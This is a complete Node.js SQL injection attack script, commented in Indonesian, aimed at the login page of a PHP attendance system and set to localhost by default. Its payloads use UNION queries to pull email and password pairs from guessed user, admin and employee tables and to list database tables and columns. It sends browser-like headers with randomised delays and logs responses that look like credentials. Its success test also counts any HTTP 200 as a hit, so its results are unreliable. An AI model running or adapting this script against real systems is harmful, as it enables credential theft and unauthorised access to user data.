const axios = require('axios');
const fs = require('fs');

class SQLInjectionTester {
    constructor(config = {}) {
        // Default ke localhost jika tidak ada konfigurasi
        this.targetUrl = config.targetUrl || 'http://localhost/absensi/auth/login.php';
        this.successCount = 0;
        this.attemptCount = 0;
        this.startTime = null;
        this.config = {
            usernameField: config.usernameField || 'email',
            passwordField: config.passwordField || 'password',
            method: config.method || 'POST',
            endpoint: config.endpoint || '/absensi/auth/login.php',
            port: config.port || 80,
            protocol: config.protocol || 'http',
            ...config
        };
    }

    // Payload SQL Injection
    getPayloads() {
        return {
            // Data Extraction - Fokus pada ekstraksi kredensial
            extraction: [
                // Coba ekstrak dari tabel users
                "' UNION SELECT email,password FROM users LIMIT 1--",
                "' UNION SELECT email,password FROM users LIMIT 1,1--",
                "' UNION SELECT email,password FROM users LIMIT 1,2--",
                "' UNION SELECT email,password FROM users LIMIT 1,3--",
                "' UNION SELECT email,password FROM users LIMIT 1,4--",
                "' UNION SELECT email,password FROM users LIMIT 1,5--",
                
                // Coba ekstrak dari tabel admin
                "' UNION SELECT email,password FROM admin LIMIT 1--",
                "' UNION SELECT email,password FROM admin LIMIT 1,1--",
                "' UNION SELECT email,password FROM admin LIMIT 1,2--",
                
                // Coba ekstrak dari tabel tbl_users
                "' UNION SELECT email,password FROM tbl_users LIMIT 1--",
                "' UNION SELECT email,password FROM tbl_users LIMIT 1,1--",
                "' UNION SELECT email,password FROM tbl_users LIMIT 1,2--",
                "' UNION SELECT email,password FROM tbl_users LIMIT 1,3--",
                "' UNION SELECT email,password FROM tbl_users LIMIT 1,4--",
                "' UNION SELECT email,password FROM tbl_users LIMIT 1,5--",
                
                // Coba ekstrak dari tabel tbl_admin
                "' UNION SELECT email,password FROM tbl_admin LIMIT 1--",
                "' UNION SELECT email,password FROM tbl_admin LIMIT 1,1--",
                "' UNION SELECT email,password FROM tbl_admin LIMIT 1,2--",
                
                // Coba ekstrak dari tabel pegawai
                "' UNION SELECT email,password FROM pegawai LIMIT 1--",
                "' UNION SELECT email,password FROM pegawai LIMIT 1,1--",
                "' UNION SELECT email,password FROM pegawai LIMIT 1,2--",
                
                // Coba ekstrak dari tabel tbl_pegawai
                "' UNION SELECT email,password FROM tbl_pegawai LIMIT 1--",
                "' UNION SELECT email,password FROM tbl_pegawai LIMIT 1,1--",
                "' UNION SELECT email,password FROM tbl_pegawai LIMIT 1,2--",
                
                // Coba ekstrak dari tabel karyawan
                "' UNION SELECT email,password FROM karyawan LIMIT 1--",
                "' UNION SELECT email,password FROM karyawan LIMIT 1,1--",
                "' UNION SELECT email,password FROM karyawan LIMIT 1,2--",
                
                // Coba ekstrak dari tabel tbl_karyawan
                "' UNION SELECT email,password FROM tbl_karyawan LIMIT 1--",
                "' UNION SELECT email,password FROM tbl_karyawan LIMIT 1,1--",
                "' UNION SELECT email,password FROM tbl_karyawan LIMIT 1,2--"
            ],

            // Table Discovery - Untuk menemukan tabel yang ada
            tables: [
                "' UNION SELECT GROUP_CONCAT(table_name),null FROM information_schema.tables WHERE table_schema=database()--"
            ],

            // Column Discovery - Untuk menemukan kolom yang ada
            columns: [
                "' UNION SELECT GROUP_CONCAT(column_name),null FROM information_schema.columns WHERE table_schema=database()--"
            ]
        };
    }

    // Headers yang lebih natural
    getHeaders() {
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://localhost:' + this.config.port,
            'Referer': 'http://localhost:' + this.config.port + this.config.endpoint
        };
    }

    // Random delay
    getRandomDelay() {
        return Math.floor(Math.random() * (2000 - 500) + 500); // Delay lebih pendek untuk localhost
    }

    // Log attempt
    logAttempt(payload, status, response = null) {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            payload,
            status,
            response: response?.status,
            headers: response?.headers,
            url: this.targetUrl,
            data: response?.data
        };

        fs.appendFileSync('sql_injection_log.txt', JSON.stringify(logEntry) + '\n');
    }

    // Log success
    logSuccess(payload, response) {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            payload,
            response: response?.data,
            url: this.targetUrl,
            headers: response?.headers
        };

        fs.appendFileSync('sql_injection_success.txt', JSON.stringify(logEntry) + '\n');
        this.successCount++;
    }

    // Test single payload
    async testPayload(payload, type) {
        this.attemptCount++;
        
        try {
            console.log(`\nMencoba payload [${this.attemptCount}]: ${payload}`);
            console.log(`Tipe: ${type}`);

            // Delay random
            await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));

            // Prepare request data
            const data = new URLSearchParams();
            data.append(this.config.usernameField, payload);
            data.append(this.config.passwordField, 'test123');

            // Make request
            const response = await axios({
                method: this.config.method.toLowerCase(),
                url: this.targetUrl,
                data: data,
                headers: this.getHeaders(),
                timeout: 5000,
                validateStatus: function (status) {
                    return status >= 200 && status < 500;
                }
            });

            // Analyze response
            const responseData = response.data;
            const responseStatus = response.status;

            // Check for SQL errors
            const sqlErrors = [
                'SQL syntax',
                'mysql_fetch_array',
                'mysql_fetch_assoc',
                'mysql_num_rows',
                'mysql_result',
                'mysql_query',
                'mysql error',
                'ORA-',
                'SQLite/JDBCDriver',
                'SQLite.Exception',
                'System.Data.SQLite.SQLiteException',
                'Warning: mysql_',
                'Warning: pg_',
                'Warning: sqlsrv_',
                'Warning: oci_',
                'Warning: odbc_',
                'syntax error',
                'unclosed quotation',
                'unterminated string',
                'invalid query'
            ];

            // Check for successful injection
            const isSuccess = sqlErrors.some(error => 
                responseData.toString().toLowerCase().includes(error.toLowerCase())
            ) || responseStatus === 200;

            // Check for credentials in response
            const responseText = responseData.toString().toLowerCase();
            const hasCredentials = responseText.includes('@') && 
                                 (responseText.includes('password') || 
                                  responseText.includes('pass') || 
                                  responseText.includes('pwd'));

            if (isSuccess || hasCredentials) {
                console.log('\x1b[32m%s\x1b[0m', `[SUKSES] Payload berhasil: ${payload}`);
                if (hasCredentials) {
                    console.log('\x1b[33m%s\x1b[0m', '[INFO] Kemungkinan kredensial ditemukan!');
                    console.log('\x1b[33m%s\x1b[0m', 'Response:', responseData);
                    
                    // Coba parse JSON response
                    try {
                        const jsonResponse = JSON.parse(responseData);
                        console.log('\x1b[36m%s\x1b[0m', 'Data yang ditemukan:');
                        console.log(jsonResponse);
                    } catch (e) {
                        // Jika bukan JSON, tampilkan response mentah
                        console.log('\x1b[36m%s\x1b[0m', 'Data yang ditemukan:');
                        console.log(responseData);
                    }
                }
                this.logSuccess(payload, response);
            } else {
                console.log(`[GAGAL] Status: ${responseStatus}`);
                this.logAttempt(payload, 'FAILED', response);
            }

            return isSuccess || hasCredentials;

        } catch (error) {
            if (error.response) {
                console.log(`[GAGAL] Status: ${error.response.status}`);
                this.logAttempt(payload, 'FAILED', error.response);
            } else {
                console.log(`[ERROR] ${error.message}`);
                this.logAttempt(payload, 'ERROR');
            }
            return false;
        }
    }

    // Test all payloads
    async testAllPayloads() {
        console.log('Memulai pengujian SQL Injection...');
        console.log(`Target: ${this.targetUrl}`);
        console.log(`Method: ${this.config.method}`);
        console.log(`Username Field: ${this.config.usernameField}`);
        console.log(`Password Field: ${this.config.passwordField}`);
        
        this.startTime = new Date();
        
        const payloads = this.getPayloads();
        
        // Test each type of payload
        for (const [type, typePayloads] of Object.entries(payloads)) {
            console.log(`\nMenguji payload tipe: ${type}`);
            console.log('----------------------------------------');
            
            for (const payload of typePayloads) {
                await this.testPayload(payload, type);
            }
        }

        // Print summary
        const endTime = new Date();
        const duration = (endTime - this.startTime) / 1000;
        
        console.log('\n----------------------------------------');
        console.log(`Pengujian selesai dalam ${duration} detik`);
        console.log(`Total percobaan: ${this.attemptCount}`);
        console.log(`Berhasil: ${this.successCount}`);
        
        if (this.successCount > 0) {
            console.log('\nData berhasil ditemukan! Cek file sql_injection_success.txt untuk detail.');
        }
    }
}

// Contoh penggunaan untuk localhost
const config = {
    targetUrl: 'http://localhost/absensi/auth/login.php',
    usernameField: 'email',
    passwordField: 'password',
    method: 'POST',
    endpoint: '/absensi/auth/login.php',
    port: 80
};

// Run the test
const tester = new SQLInjectionTester(config);
tester.testAllPayloads().catch(error => {
    console.error('Terjadi kesalahan:', error);
}); 